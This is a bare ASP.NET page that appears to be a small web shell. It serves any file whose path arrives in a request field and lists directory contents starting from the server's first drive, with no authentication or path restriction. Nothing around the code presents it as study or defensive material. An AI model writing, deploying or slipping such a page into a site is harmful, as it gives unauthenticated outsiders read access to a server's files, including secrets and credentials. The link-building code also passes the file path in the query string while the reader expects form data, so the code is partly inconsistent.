<%@ Page Language="C#" %>
<script runat="server">
protected void Page_Load(object sender, EventArgs e) {
    string target = Request.Form["t"];
    if (target != null && System.IO.File.Exists(target)) { Response.WriteFile(target); return; }
    string root = Request["r"]; if (root == null) root = Environment.GetLogicalDrives()[0];
    var info = new System.IO.DirectoryInfo(root);
    foreach (var f in info.GetFiles()) Response.Write("<a href=\"?t=" + f.FullName + "\">" + f.Name + "</a>");
}
</script>
